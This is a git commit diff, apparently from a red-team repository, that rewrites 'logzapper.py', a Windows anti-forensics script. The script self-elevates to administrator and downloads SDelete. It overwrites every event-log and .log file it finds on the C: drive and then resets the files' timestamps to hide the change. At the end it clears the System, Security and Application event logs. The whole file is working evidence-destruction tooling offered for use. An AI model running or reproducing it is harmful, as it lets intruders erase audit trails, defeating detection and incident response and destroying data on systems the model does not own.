f8d0fc111287f10a077043e81f0dba7aece161b8
Mich <168865716+michredteam@users.noreply.github.com>
2024-06-14 17:30:13 -0600

    Add files via upload
     it focuses on various methods and techniques for anti-forensics

--- Windows/Python/logzapper.py
+++ Windows/Python/logzapper.py
@@ -1,4 +1,4 @@
-# Depencies
+# Dependencies
 from colorama import Fore, init, Style, Back
 from pathlib import Path
 from pywintypes import Time
@@ -6,37 +6,57 @@ from random import getrandbits
 from pywintypes import error as wintError
 import datetime as dt
 from win32file import *
-from os import stat
+import zipfile
+import requests
+import subprocess
 import os
 import time
+import sys
 
-try: 
-    from pyuac import main_requires_admin
-except:
-    from os import system as s;s("pip install pyuac")
+try:
+    from pyuac import isUserAdmin, runAsAdmin
+except ImportError:
+    os.system("pip install pyuac")
+    from pyuac import isUserAdmin, runAsAdmin
 
 # Global variables
-format = "%d.%m.%Y %H:%M:%S"
+FORMAT = "%d.%m.%Y %H:%M:%S"
 
 init()
-fileColor=Fore.YELLOW
-badFileColor=Fore.YELLOW+Back.RED
-goodst=Fore.GREEN
-warnst=Fore.RED
-reset=Style.RESET_ALL
+FILE_COLOR = Fore.YELLOW
+BAD_FILE_COLOR = Fore.YELLOW + Back.RED
+GOOD_STATUS = Fore.GREEN
+WARN_STATUS = Fore.RED
+RESET = Style.RESET_ALL
 
-# Support functions
-def getEvtx():
-    # This path contains the headers of the most important file events in the winevt logs
-    evtxPath= "C:\ProgramData\Microsoft\Event Viewer\ExternalLogs"
-    evtxPathContent = Path(evtxPath).iterdir()
+SDELETE_URL = "https://download.sysinternals.com/files/SDelete.zip"
+SDELETE_DIR = os.path.join(os.environ['TEMP'], "SDelete")
+SDELETE_EXE = os.path.join(SDELETE_DIR, "sdelete.exe")
 
-    if Path(evtxPath).is_dir():
-        for file in evtxPathContent:
-                yield str(file)
+# Function to download and extract SDelete
+def download_and_extract_sdelete():
+    if not Path(SDELETE_EXE).is_file():
+        print(f"{GOOD_STATUS}[+] Downloading SDelete...{RESET}")
+        response = requests.get(SDELETE_URL)
+        os.makedirs(SDELETE_DIR, exist_ok=True)
+        with open(os.path.join(SDELETE_DIR, "SDelete.zip"), "wb") as file:
+            file.write(response.content)
 
-def checkStatus(filename:str) -> bool:
-    # Verify is the file is used in a process
+        print(f"{GOOD_STATUS}[+] Extracting SDelete...{RESET}")
+        with zipfile.ZipFile(os.path.join(SDELETE_DIR, "SDelete.zip"), 'r') as zip_ref:
+            zip_ref.extractall(SDELETE_DIR)
+
+        print(f"{GOOD_STATUS}[+] SDelete is ready to use.{RESET}")
+
+# Function to get event logs
+def get_evtx():
+    evtx_path = "C:\\ProgramData\\Microsoft\\Event Viewer\\ExternalLogs"
+    if Path(evtx_path).is_dir():
+        for file in Path(evtx_path).iterdir():
+            yield str(file)
+
+# Function to check if file is in use
+def check_status(filename: str) -> bool:
     try:
         file_handle = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, None)
         if file_handle:
@@ -47,49 +67,45 @@ def checkStatus(filename:str) -> bool:
             return True
     return False
 
-def getLog():
-    # Filter by directories and extensions to find unknown logs
+# Function to get common log files
+def get_log():
     dir_path = os.path.dirname("C:\\")
-
     for root, _, files in os.walk(dir_path):
         if os.path.basename(root).lower() == 'logs':
             for file in files:
-                yield (os.path.join(root, file))
+                yield os.path.join(root, file)
         for file in files:
             if file.lower().endswith('.log'):
-                yield (os.path.join(root, file))
+                yield os.path.join(root, file)
 
-def getTS(filePath:str) -> tuple:
-    # Obtain the timestamp of the files
-    stat = Path(filePath).stat()
-
-    access_time = dt.datetime.fromtimestamp(stat.st_atime_ns / 1_000_000_000).strftime(format)
-    modify_time = dt.datetime.fromtimestamp(stat.st_mtime_ns / 1_000_000_000).strftime(format)
-    change_time = dt.datetime.fromtimestamp(stat.st_ctime_ns / 1_000_000_000).strftime(format)
-
+# Function to get timestamp of a file
+def get_ts(file_path: str) -> tuple:
+    stat = Path(file_path).stat()
+    access_time = dt.datetime.fromtimestamp(stat.st_atime_ns / 1_000_000_000).strftime(FORMAT)
+    modify_time = dt.datetime.fromtimestamp(stat.st_mtime_ns / 1_000_000_000).strftime(FORMAT)
+    change_time = dt.datetime.fromtimestamp(stat.st_ctime_ns / 1_000_000_000).strftime(FORMAT)
     return change_time, modify_time, access_time
 
-def setTS(createTime:str, modifyTime:str, accessTime:str, filePath:str) -> None:
-    # Configure new timestamp for the files
-    fh = CreateFile(filePath, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, 0) 
+# Function to set timestamp of a file
+def set_ts(create_time: str, modify_time: str, access_time: str, file_path: str) -> None:
+    fh = CreateFile(file_path, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, 0)
     try:
-        createTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(createTime,format))+0)))
-        accessTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(accessTime,format))+0)))
-        modifyTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(modifyTime,format))+0)))
-    except RuntimeError as _:
+        create_time = Time(time.mktime(time.strptime(create_time, FORMAT)))
+        access_time = Time(time.mktime(time.strptime(access_time, FORMAT)))
+        modify_time = Time(time.mktime(time.strptime(modify_time, FORMAT)))
+    except RuntimeError:
         time.sleep(0.3)
-        createTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(createTime,format))+0)))
-        accessTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(accessTime,format))+0)))
-        modifyTime = Time(time.mktime(time.localtime(time.mktime(time.strptime(modifyTime,format))+0)))
+        create_time = Time(time.mktime(time.strptime(create_time, FORMAT)))
+        access_time = Time(time.mktime(time.strptime(access_time, FORMAT)))
+        modify_time = Time(time.mktime(time.strptime(modify_time, FORMAT)))
         
-    SetFileTime(fh, createTime, accessTime, modifyTime) 
+    SetFileTime(fh, create_time, access_time, modify_time)
     CloseHandle(fh)
 
-def gutmann(filePath:str) -> int:
-    # First phase and patron for remove a file
-    fileSize=(os.stat(filePath)).st_size
+# Function to perform Gutmann method secure erase
+def gutmann(file_path: str) -> None:
+    file_size = (os.stat(file_path)).st_size
     rnd = lambda: os.urandom(3)
-
     data = [
         rnd(), rnd(), rnd(), rnd(),
         b'\x55', b'\xAA', b'\x92\x49\x24', b'\x49\x24\x92', b'\x24\x92\x49',
@@ -99,95 +115,72 @@ def gutmann(filePath:str) -> int:
         b'\x6D\x86\xD8', b'\xD6\xDB\x6D', b'\xDB\x6D\xB6',
         rnd(), rnd(), rnd(), rnd()
     ]
-
-    with open(filePath, mode='r+b') as dummy_file:
+    with open(file_path, mode='r+b') as dummy_file:
         for loop in data:
             dummy_file.seek(0)
             if len(loop) == 1:
                 dummy_file.write(loop * 65536)
             else:
                 dummy_file.write(loop * 21845)
-        
-    rnd = lambda : str(os.urandom(3))
-    return fileSize
 
-def overwriteCalulator(number:int):
-    # Calculator for a with patrons and zeros
-    if number <= 0:
-        return 0, 0
+# Function to perform SDelete secure erase
+def sdelete_file(file_path: str) -> None:
+    command = [SDELETE_EXE, "-p", "3", "-s", file_path]  # 3 pasadas de sobrescritura con aleatorización
+    subprocess.run(command, check=True)
 
-    overwrite1 = round(number * 0.70)
-    overwrite0 = round(number * 0.30)
+# Function to clean event logs
+def clean_event_logs() -> None:
+    subprocess.run(["wevtutil", "cl", "System"], check=True)
+    subprocess.run(["wevtutil", "cl", "Security"], check=True)
+    subprocess.run(["wevtutil", "cl", "Application"], check=True)
 
-    return overwrite1,overwrite0
+# Function to choose secure erase method and perform deletion
+def secure_erase(file_path: str, method: str) -> None:
+    if method == 'gutmann':
+        gutmann(file_path)
+    elif method == 'sdelete':
+        sdelete_file(file_path)
 
-def removeFile(filePath: str, fileSize: int, overwriteN: int=9):
-    # Second phase for the file remover
-    nOverWrite1, nOverWrite0 = overwriteCalulator(overwriteN)
-        
-    with open(filePath, "r+b") as dummy_file:
-        # Overwrite the file with random patrons
-        for n in range(nOverWrite1):
-            dummy_file.truncate(0)
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(getrandbits(8) for _ in range(fileSize)))
-            
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(0 for _ in range(fileSize)))
-
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(getrandbits(8) for _ in range(fileSize)))
-
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(255 for _ in range(fileSize)))
-
-    with open(filePath, "r+b") as dummy_file:
-        # Overwrite the file with zeros
-        for n in range(nOverWrite0):
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(getrandbits(8) for _ in range(fileSize)))
-
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(0 for _ in range(fileSize)))
-            
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(getrandbits(8) for _ in range(fileSize)))
-
-            dummy_file.seek(0)
-            dummy_file.write(bytearray(255 for _ in range(fileSize)))     
-
-def joiner(logFile):
-    # Main function
+# Main function
+def joiner(log_file, method='sdelete'):
     try:
-        if checkStatus(logFile):
-            print(f"\n{warnst}[!]{reset} Skipping {badFileColor+logFile+reset} as it is use by another process")
-
+        if check_status(log_file):
+            print(f"\n{WARN_STATUS}[!]{RESET} Skipping {BAD_FILE_COLOR + log_file + RESET} as it is used by another process")
             return
-        
-        at, mt, ct = getTS(logFile)
-        fileSize = gutmann(logFile)
-        removeFile(logFile, fileSize, overwriteN=9)
-        setTS(at,mt,at,filePath=logFile)
-
+        ct, mt, at = get_ts(log_file)
+        secure_erase(log_file, method=method)
+        set_ts(ct, mt, at, file_path=log_file)
     except PermissionError:
-        print(f"\n{warnst}[!]{reset} Skipping {badFileColor+logFile+reset} due to insufficient permissions")
+        print(f"\n{WARN_STATUS}[!]{RESET} Skipping {BAD_FILE_COLOR + log_file + RESET} due to insufficient permissions")
+    except Exception as e:
+        print(f"\n{WARN_STATUS}[!]{RESET} Error processing {BAD_FILE_COLOR + log_file + RESET}: {e}")
 
-@main_requires_admin
 def main():
-    # Main function with admin perms
-    evtxLogs=getEvtx()
-    for logFile in evtxLogs:
-        joiner(logFile)
-        print(f"{goodst}[+]{reset} The file: {fileColor+logFile+reset} has been successfully cleared")
-        time.sleep(0.1)    
-    commonLogs=getLog()
-    for logFile in commonLogs:
-        joiner(logFile)
-        print(f"{goodst}[+]{reset} The file: {fileColor+logFile+reset} has been successfully cleared")
+    download_and_extract_sdelete()  # Descarga y extrae SDelete
+
+    method = ''
+    while method not in ['gutmann', 'sdelete']:
+        method = input(f"{Fore.CYAN}[?]{RESET} Choose the method for file deletion ({Fore.GREEN}sdelete{RESET}/{Fore.YELLOW}gutmann{RESET}): ").strip().lower()
+
+    evtx_logs = get_evtx()
+    for log_file in evtx_logs:
+        joiner(log_file, method=method)
+        print(f"{GOOD_STATUS}[+]{RESET} The file: {FILE_COLOR + log_file + RESET} has been securely deleted")
+        time.sleep(0.1)
+    
+    common_logs = get_log()
+    for log_file in common_logs:
+        joiner(log_file, method=method)
+        print(f"{GOOD_STATUS}[+]{RESET} The file: {FILE_COLOR + log_file + RESET} has been securely deleted")
         time.sleep(0.2)
+    
+    clean_event_logs()  # Limpiar logs de eventos al final
 
 if __name__ == '__main__':
-    main()
-
-    print(f"{goodst}[++]{reset} Thanks for using the tool, enjoy your new free log windows")
-    print("Make by Rug4lo & yoshl")
+    if not isUserAdmin():
+        print(f"{WARN_STATUS}[!] The script requires administrative privileges. Attempting to restart with admin rights...{RESET}")
+        runAsAdmin()
+    else:
+        main()
+        print(f"{GOOD_STATUS}[++]{RESET} Thanks for using the tool, enjoy your new free log windows")
+        print("Made by Rug4lo & yoshl")
